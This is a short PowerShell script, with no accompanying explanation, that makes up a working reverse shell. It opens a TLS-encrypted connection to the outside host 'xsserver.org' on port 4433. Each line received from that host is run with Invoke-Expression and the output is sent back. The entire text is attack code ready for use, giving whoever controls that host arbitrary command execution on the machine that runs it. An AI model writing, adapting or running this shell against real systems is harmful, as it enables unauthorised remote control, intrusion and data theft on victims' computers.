
$hostname = "xsserver.org"
$hostport = "4433"

$tc = New-Object System.Net.Sockets.TcpClient($hostname, $hostport)
$ssl = New-Object System.Net.Security.SslStream($tc.GetStream())
$ssl.AuthenticateAsClient($hostname)

$tcreader = New-Object System.IO.StreamReader($ssl)
$tcwriter = New-Object System.IO.StreamWriter($ssl)
$tcwriter.AutoFlush = $true

Function SendOutput {
  param (
    $Writer,
    $Output
  )
  
  $Writer.WriteLine($($Output | Out-String))
}

While(($cmd = $tcreader.ReadLine()) -ne $null) {
  Try {
    SendOutput -Writer $tcwriter -Output $(Invoke-Expression -Command "$cmd")
  } Catch {
    SendOutput -Writer $tcwriter -Output $_
  }
}
